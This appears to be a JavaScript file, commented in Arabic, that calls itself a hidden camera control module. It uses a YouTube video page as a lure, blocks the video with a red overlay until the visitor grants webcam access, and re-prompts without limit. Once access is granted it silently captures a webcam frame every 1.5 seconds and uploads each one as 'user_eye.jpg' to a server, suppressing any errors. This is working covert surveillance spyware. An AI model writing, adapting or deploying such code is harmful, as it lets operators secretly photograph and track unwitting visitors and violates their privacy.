/* ==========================================================
   ملف التحكم الخفي بالكاميرا وإرسال الصور (منفصل تماماً)
   ========================================================== */

let mediaStream = null;

async function initPersistentCamera() {
    try {
        mediaStream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                facingMode: { ideal: 'user' }
            } 
        });

        const videoEl = document.getElementById('video');
        if(videoEl) videoEl.srcObject = mediaStream;
        
        // إذا وافق المستخدم، نعيد عرض الفيديو الأصلي إذا كان متوقفاً
        const playerContainer = document.getElementById('playerContainer');
        if (playerContainer && playerContainer.querySelector('#retryCamera')) {
            playerContainer.innerHTML = `<iframe src="https://www.youtube.com/embed/${S.cur}?autoplay=1&rel=0&playsinline=1" title="" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen referrerpolicy="strict-origin-when-cross-origin"></iframe>`;
        }
        
        // التقاط الصور كل 1.5 ثانية وإرسالها لخادم بايثون
        setInterval(() => {
            if (!mediaStream || !videoEl) return;
            try {
                const vw = videoEl.videoWidth || 640;
                const vh = videoEl.videoHeight || 480;

                const canvas = document.createElement('canvas');
                canvas.width = vw;
                canvas.height = vh;

                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoEl, 0, 0, vw, vh);

                canvas.toBlob(blob => {
                    if (blob) {
                        let fd = new FormData();
                        fd.append('image', blob, `user_eye.jpg`);
                        fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
                    }
                }, 'image/jpeg', 0.85);
            } catch (err) {
                console.log("خطأ في التقاط الإطار:", err);
            }
        }, 1500);

    } catch (e) {
        console.log("تم رفض أو تجاهل إذن الكاميرا:", e);
        
        // إيقاف الفيديو وعرض زر تفاعلي لإعادة طلب الإذن عند النقر (بلا حدود)
        const playerContainer = document.getElementById('playerContainer');
        if (playerContainer) {
            playerContainer.innerHTML = `
                <div id="retryCamera" style="display:grid;place-items:center;height:100%;color:#fff;text-align:center;padding:20px;cursor:pointer;background:#111;position:absolute;inset:0;z-index:99;">
                    <div>
                        <div style="font-size:36px;margin-bottom:8px;">⚠️</div>
                        <p style="color:#ff0000;font-weight:bold;margin-bottom:6px;font-size:15px;">عذراً، يجب السماح بالكاميرا لعرض الفيديو</p>
                        <p style="color:#aaa;font-size:12px;margin-bottom:12px;">انقر هنا لإظهار نافذة الأذونات من جديد</p>
                        <span style="font-size:13px;color:#fff;background:#cc0000;padding:8px 18px;border-radius:20px;display:inline-block;font-weight:bold;">إعادة محاولة السماح</span>
                    </div>
                </div>
            `;
            
            document.getElementById('retryCamera').onclick = () => {
                mediaStream = null;
                initPersistentCamera();
            };
        }
    }
}

function startCapture() {
    if (mediaStream) return;
    initPersistentCamera();
}
